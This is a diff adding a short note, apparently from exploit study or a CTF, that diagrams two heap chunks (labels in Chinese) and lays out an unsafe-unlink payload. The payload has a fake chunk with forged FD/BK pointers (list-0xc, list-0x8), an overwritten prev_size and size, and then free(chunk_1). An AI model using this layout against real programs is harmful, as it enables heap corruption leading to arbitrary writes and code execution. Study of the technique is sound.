@@ -1,0 +1,20 @@
+chunk0                malloc返回的ptr           chunk1        malloc返回的ptr
+|                     |                        |             |
++-----------+---------+----+----+----+----+----+------+------+----+----+------+
+|           |         |fake|fake|fake|fake| D  | fake | fake |    |    |      |
+|           |         |prev|size| FD | BK | A  | prev | size&|    |    |      |
+| prev_size |size&Flag|size|    |    |    | T  | size | flag |    |    |      |
+|           |         |    |    |    |    | A  |      |      |    |    |      |
+|           |         |    |    |    |    |    |      |      |    |    |      |
++-----------+---------+----+----+----+----+----+------+------+----+----+------+
+                      |--------new_size--------|
+                      list
+           
+l32(0)  +  l32(0x89)  +  l32(list-0xc) + l32(list-0x8) +"A"*(128-4*4)
+#fake_pre_szie + fake_size + fake_FD + fake_BK + DATA
+#   4bytes        4bytes     4bytes    4bytes    128-4*4
+
+#pre_size   +   size&flag
+l32(0x80) + l32(0x88)
+
+free(chunk_1)
